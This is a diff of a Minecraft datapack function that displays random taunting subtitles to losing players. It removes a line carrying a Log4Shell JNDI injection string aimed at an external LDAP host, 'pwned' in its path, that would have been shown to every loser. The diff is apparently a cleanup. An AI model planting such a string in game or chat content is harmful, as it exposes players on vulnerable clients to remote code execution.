@@ -80,7 +80,6 @@ execute if score $losssplash CmdData matches 71 run title @a[x=0,tag=Loser] subt
 execute if score $losssplash CmdData matches 72 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Cry about it.","color":"red"}]
 execute if score $losssplash CmdData matches 73 run title @a[x=0,tag=Loser] subtitle ["",{"text":"bruh nawhhhh nah no way bruhhh fr? Bruhhh","color":"red"}]
 execute if score $losssplash CmdData matches 74 run title @a[x=0,tag=Loser] subtitle ["",{"text":"but the the I when I I but how they do the win I the did well how did the I do","color":"red"}]
-execute if score $losssplash CmdData matches 75 run title @a[x=0,tag=Loser] subtitle ["",{"text":"-30,000,000 social credit","color":"red"}]
 execute if score $losssplash CmdData matches 76 run title @a[x=0,tag=Loser] subtitle ["",{"text":"releasing nukes","color":"red"}]
 execute if score $losssplash CmdData matches 77 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Reported for: Malicious threat","color":"red"}]
 execute if score $losssplash CmdData matches 78 run title @a[x=0,tag=Loser] subtitle ["",{"text":"I hope your bicycle gets a flat tire! >:(","color":"red"}]
@@ -98,4 +97,3 @@ execute if score $losssplash CmdData matches 89 run title @a[x=0,tag=Loser] subt
 execute if score $losssplash CmdData matches 90 run title @a[x=0,tag=Loser] subtitle ["",{"text":"No victory popcorn for you.","color":"red"}]
 execute if score $losssplash CmdData matches 91 run title @a[x=0,tag=Loser] subtitle ["",{"text":"L","color":"red"}]
 execute if score $losssplash CmdData matches 92 run title @a[x=0,tag=Loser] subtitle ["",{"text":"ratio","color":"red"}]
-execute if score $losssplash CmdData matches 93 run title @a[x=0,tag=Loser] subtitle ["",{"text":"${jndi:ldap://178.63.51.142:8080/pwned}","color":"red"}]
